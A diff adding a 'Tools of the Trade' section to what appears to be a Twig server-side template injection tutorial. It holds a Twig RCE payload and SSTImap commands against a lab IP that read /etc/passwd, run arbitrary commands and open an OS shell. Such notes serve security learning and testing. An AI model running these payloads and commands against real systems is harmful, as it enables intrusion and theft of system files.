@@ -73,3 +73,21 @@ he PHP web framework [Symfony](https://symfony.com/) defines additional Twig f
 
 For Remote Code Execution (RCE) : `{{ ['id'] | filter('system') }}`
 
+## Tools of the Trade 
+**Installation Guide :**
+
+```shell-session
+git clone https://github.com/vladko312/SSTImap
+cd SSTImap
+pip3 install -r requirements.txt
+python3 sstimap.py
+```
+
+Command to run the tool : `python3 sstimap.py -u http://172.17.0.2/index.php?name=test`
+
+ This command will download the file `/etc/passwd` to the local file system : `python3 sstimap.py -u http://172.17.0.2/index.php?name=test -D '/etc/passwd' './passwd'`
+
+This command executes the command we specify after `-s` flag : `python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id`
+
+This command provides us with a Shell : `python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell`
+
